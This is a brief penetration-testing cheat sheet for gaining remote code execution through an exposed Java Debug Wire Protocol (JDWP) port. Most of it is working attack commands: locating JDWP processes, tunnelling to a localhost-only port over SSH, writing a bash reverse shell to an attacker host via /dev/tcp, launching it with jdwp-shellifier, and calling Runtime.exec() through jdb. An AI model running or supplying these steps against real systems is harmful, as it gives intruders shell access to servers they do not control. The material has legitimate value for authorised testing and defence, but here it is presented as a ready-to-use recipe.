# JDWP Java Debug Wire Protocol RCE

If a Java process runs with `-agentlib:jdwp=transport=dt_socket,address=localhost:<port>` it exposes debug interface.

**Check for JDWP:**
```bash
ps aux | grep jdwp
# or: netstat -tnlp | grep <port>
```

**SSH tunnel if localhost only:**
```bash
ssh <user>@<TARGET> -L 8000:127.0.0.1:8000
```

**Exploit with jdwp-shellifier:**
```bash
# Write shell script first
echo '#!/bin/bash' > /tmp/shell.sh
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /tmp/shell.sh
chmod +x /tmp/shell.sh

python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd '/tmp/shell.sh'
```

**Manual via jdb:**
```bash
jdb -attach localhost:8000
# Then set breakpoints and execute Runtime.exec()
```
